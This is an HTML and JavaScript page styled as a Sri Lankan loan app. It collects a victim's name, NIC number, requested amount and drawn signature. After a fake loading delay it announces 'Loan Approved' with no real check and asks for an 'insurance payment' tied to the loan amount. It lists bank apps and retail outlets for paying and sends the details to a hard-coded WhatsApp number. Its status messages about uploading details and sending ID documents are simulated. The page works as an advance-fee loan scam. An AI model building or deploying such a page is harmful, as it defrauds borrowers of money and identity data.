<!DOCTYPE html>
<html lang="si">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>EzC Signature App</title>

<style>
*{box-sizing:border-box;}

body{
    margin:0;
    font-family:system-ui, Arial;
    background:#eaeef3;
}

.app{
    max-width:420px;
    margin:auto;
    min-height:100vh;
    background:#fff;
}

.page{padding:16px;}
h3{text-align:center;}

label{
    display:block;
    margin-top:14px;
    font-weight:600;
}

input{
    width:100%;
    padding:14px;
    margin-top:6px;
    border-radius:12px;
    border:1px solid #ccc;
    font-size:16px;
}

button{
    width:100%;
    padding:14px;
    margin-top:14px;
    border:none;
    border-radius:14px;
    font-size:16px;
    color:#fff;
    background:#27ae60;
}

.clear-btn{background:#e74c3c;}
.pay-btn{background:#2980b9;}
.whatsapp-btn{background:#25D366;}
.help-btn{background:#7f8c8d;}

canvas{
    width:100%;
    height:160px;
    border:2px dashed #aaa;
    border-radius:12px;
    margin-top:8px;
    touch-action:none;
}

.statement{
    margin-top:12px;
    padding:12px;
    background:#f4f6f8;
    border-radius:12px;
    font-size:14px;
    line-height:1.5;
}

/* BANK COLORS */
.bank-commercial{background:#1e5bd7;}
.bank-sampath{background:#f39c12;}
.bank-boc{background:#f1c40f;color:#000;}
.bank-nsb{background:#e74c3c;}

#loading{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,.95);
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    z-index:999;
}

.spinner{
    width:48px;
    height:48px;
    border:5px solid #6dd5fa;
    border-top:5px solid #27ae60;
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin-bottom:20px;
}

@keyframes spin{100%{transform:rotate(360deg);}}

#page2,#page3{display:none;}

#popup{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.4);
    display:flex;
    align-items:center;
    justify-content:center;
    opacity:0;
    pointer-events:none;
    transition:.25s;
    z-index:1000;
}

#popup.active{
    opacity:1;
    pointer-events:auto;
}

.popup-box{
    background:#fff;
    padding:20px;
    width:85%;
    max-width:320px;
    border-radius:14px;
    text-align:center;
}
</style>
</head>

<body>

<div id="loading">
 <div class="spinner"></div>
 <div id="loadingText">Loading...</div>
</div>

<div class="app">

<!-- PAGE 1 -->
<div class="page" id="page1">
<h3>Customer Details</h3>

<label>Name</label>
<input id="name">

<label>NIC</label>
<input id="nic">

<label>Amount (Rs)</label>
<input type="number" id="amount">

<div class="statement">
මා විසින් ලබාගන්නා මෙම මුදල, ඉහත ලේඛනයේ සඳහන් පොලී අනුපාතයන්ට එකඟව මුදල් ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
</div>

<label>Signature</label>
<canvas id="sign"></canvas>
<button class="clear-btn" onclick="clearSign()">Clear Signature</button>

<button onclick="goNext()">Next</button>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
<h3>Loan Approved</h3>

<p><b>Customer ID:</b> <span id="customerId"></span></p>
<p><b>Name:</b> <span id="showName"></span></p>
<p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
<p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>

<label>Upload Receipt</label>
<input type="file" id="receipt" accept="image/*">

<button class="pay-btn" onclick="goPayment()">ගෙව්ම කරන ආකාරය / Pay Now</button>
<button class="whatsapp-btn" onclick="sendPage2WhatsApp()">WhatsApp Message</button>
</div>

<!-- PAGE 3 -->
<div class="page" id="page3">
<h3>ඔබ ගෙවීම කරන්නෙ කොහොමද?</h3>

<button onclick="selectType('Online')">Online Transfer</button>
<button onclick="selectType('Cash')">Cash Payment</button>

<div id="onlineOptions" style="display:none">
<button class="bank-sampath" onclick="selectMethod('Sampath Vishwa')">Sampath Vishwa</button>
<button class="bank-boc" onclick="selectMethod('BOC Flex')">BOC Flex</button>
<button class="bank-commercial" onclick="selectMethod('Commercial App')">Commercial App</button>
<button class="bank-nsb" onclick="selectMethod('NSB Pay')">NSB Pay</button>
</div>

<div id="cashOptions" style="display:none">
<button onclick="selectMethod('Food City')">Food City</button>
<button onclick="selectMethod('Communication')">Communication</button>
<button onclick="selectMethod('Dialog Arcade')">Dialog Arcade</button>
<button onclick="selectMethod('Cargills')">Cargills</button>
<button onclick="selectMethod('Singer')">Singer</button>
</div>

<button class="help-btn" onclick="sendHelp()">උදව් / Help</button>
</div>

</div>

<!-- POPUP -->
<div id="popup">
<div class="popup-box">
<div id="popupText"></div>
<button onclick="popup.classList.remove('active')">OK</button>
</div>
</div>

<script>
const WHATSAPP_NO="94742089009";

const page1=page2=page3=null;
const nameInput=document.getElementById("name");
const nicInput=document.getElementById("nic");
const amountInput=document.getElementById("amount");

const customerId=document.getElementById("customerId");
const showName=document.getElementById("showName");
const showAmount=document.getElementById("showAmount");
const insurance=document.getElementById("insurance");

const onlineOptions=document.getElementById("onlineOptions");
const cashOptions=document.getElementById("cashOptions");

const loading=document.getElementById("loading");
const loadingText=document.getElementById("loadingText");

let AUTO_CUSTOMER_ID="",paymentType="",paymentMethod="";

/* POPUP */
function showPopup(msg){
 popupText.innerText=msg;
 popup.classList.add("active");
}

/* INSURANCE */
function calculateInsurance(a){
 a=parseInt(a);
 if(a<=30000)return 2000;
 if(a<=40000)return 2500;
 if(a<=50000)return 3000;
 if(a<=100000)return 3500;
 if(a<=200000)return 4000;
 if(a<=300000)return 4000;
 if(a<=400000)return 5000;
 return 5500;
}

/* SIGN */
const c=document.getElementById("sign");
const ctx=c.getContext("2d");
let draw=false;
c.onpointerdown=e=>{draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)};
c.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke()}};
c.onpointerup=()=>draw=false;
function clearSign(){ctx.clearRect(0,0,c.width,c.height)}

/* PAGE FLOW */
function goNext(){
 if(!nameInput.value.trim()||!nicInput.value.trim()||!amountInput.value){
  showPopup("කරුණාකර සියලු විස්තර පුරවන්න");
  return;
 }
 loading.style.display="flex";
 setTimeout(()=>{
  loading.style.display="none";
  AUTO_CUSTOMER_ID="EZC-"+Date.now();
  customerId.innerText=AUTO_CUSTOMER_ID;
  showName.innerText=nameInput.value;
  showAmount.innerText=amountInput.value;
  insurance.innerText=calculateInsurance(amountInput.value);
  document.getElementById("page1").style.display="none";
  document.getElementById("page2").style.display="block";
 },5000);
}

function goPayment(){
 document.getElementById("page2").style.display="none";
 document.getElementById("page3").style.display="block";
}

function sendPage2WhatsApp(){
 const msg=`Customer Details
ID: ${AUTO_CUSTOMER_ID}
Name: ${nameInput.value}
Amount: Rs.${showAmount.innerText}
Insurance: Rs.${insurance.innerText}`;
 window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
}

function selectType(t){
 paymentType=t;
 onlineOptions.style.display=t==="Online"?"block":"none";
 cashOptions.style.display=t==="Cash"?"block":"none";
}

function selectMethod(m){
 paymentMethod=m;
 loading.style.display="flex";
 loadingText.innerText="ඔබේ විස්තර upload කරමින් පවති...";
 setTimeout(()=>{
  loadingText.innerText="WhatsApp හරහා ID document යවන ලදි";
  setTimeout(()=>{
   loading.style.display="none";
   const msg=`Payment Details
ID: ${AUTO_CUSTOMER_ID}
Method: ${paymentMethod}
Amount: Rs.${showAmount.innerText}
Insurance: Rs.${insurance.innerText}`;
   window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
  },4000);
 },5000);
}

function sendHelp(){
 const msg="ගෙවීම කරන විදිය පැහැදිලි නැහැ. කරුණාකර උදව් කරන්න.";
 window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
}
</script>

</body>
</html>
